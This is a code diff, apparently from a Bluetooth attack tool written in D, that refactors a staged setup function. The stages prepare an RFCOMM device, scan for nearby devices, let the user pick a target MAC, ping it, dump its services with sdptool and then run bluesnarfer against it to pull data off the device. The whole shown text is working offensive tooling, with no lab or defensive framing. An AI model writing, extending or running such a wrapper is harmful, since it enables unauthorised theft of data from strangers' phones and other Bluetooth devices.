@@ -82,7 +82,6 @@ void rext(){
 }
 
 bool setup(int stage){
-	bool res = false;
 	switch(stage) {
 		case Stages.RFCOMM:
 			int stat = 0;
@@ -93,29 +92,20 @@ bool setup(int stage){
 			stat += executeShell("mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0").status;
 			stat += executeShell("mknod --mode=666 /dev/rfcomm0 c 216 0").status;
 			stat += executeShell("hciconfig -a hci0 up").status;
-			if(stat != 0) res = false;
-			else res = true;
-		break;
+			return stat == 0;
 		case Stages.TEST:
 			auto p = executeShell("hciconfig hci0");
-			string outp = p.output;
-			int code = p.status;
-			if(code != 0) res = false;
-			else {
-				writeln(outp);
-				res = true;
-			}
-		break;
+			if(p.status != 0) return false;
+			writeln(p.output);
+			return true;
 		case Stages.SCAN:
 			auto p = executeShell("hcitool scan");
 			string output = p.output;
 			string[] targets;
 
 			if(output.length < 18){
-				res = false;
 				writeln("Couldn't find any targets :(");
 				rext();
-				break;
 			}
 			if(output.indexOf("\n") == -1)
 				targets = [output];
@@ -140,15 +130,12 @@ bool setup(int stage){
 			}
 			if(num >= i || num < 0) {
 				writeln(":: [\033[1;31mX\033[0m] No target with such number!");
-				res = false;
-				break;
+				return false;
 			}
 			TARGET_BT_MAC = targ_list[num][1..18];
 			writeln(":: proceeding for mac '" ~ TARGET_BT_MAC ~ "'");
-			res = true;
-		break;
+			return true;
 		case Stages.PING:
-			auto pipe = pipe();
 			auto p = executeShell("l2ping -c 2 " ~ TARGET_BT_MAC);
 			int result = p.status;
 
@@ -159,12 +146,8 @@ bool setup(int stage){
 				}
 			}
 
-			if(result != 0) {
-				res = false;
-				break;
-			}
-			res = true;
-		break;
+			if(result != 0) return false;
+			return true;
 		case Stages.DUMP:
 			auto p = executeShell("sdptool browse " ~ TARGET_BT_MAC);
 			string output = p.output;
@@ -195,14 +178,11 @@ bool setup(int stage){
 					emext();
 				}
 			}
-			res = true;
-		break;
+			return true;
 		case Stages.EXEC:
 			auto p = executeShell("bluesnarfer -b -C " ~ to!string(TARGET_BT_CHAN) ~ " " ~ TARGET_BT_MAC ~ " -i");
 			writeln("\n:: bluesnarfer says:\n" ~ p.output);
-			res = (p.status == 0);
-		break;
-		default: break;
+			return p.status == 0;
+		default: assert(0);
 	}
-	return res;
 }
